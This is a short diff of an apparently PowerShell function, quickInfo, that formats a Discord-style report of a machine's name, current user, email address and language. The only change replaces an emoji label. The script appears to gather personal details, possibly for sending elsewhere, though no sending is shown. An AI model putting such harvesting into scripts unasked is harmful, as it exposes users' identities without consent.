@@ -212,7 +212,7 @@ Function quickInfo{
 ```````COPYTIGHT 2075-2077 ROBCO INDUSTRIES``````
 
 ``````SYSTEM INFORMATION FOR $env:COMPUTERNAME``````
-:man_detective: **User Information** :man_detective:
+:Hola: **User Information** :Hola:
 - **Current User**          : ``$env:USERNAME``
 - **Email Address**         : ``$email``
 - **Language**              : ``$systemLanguage``
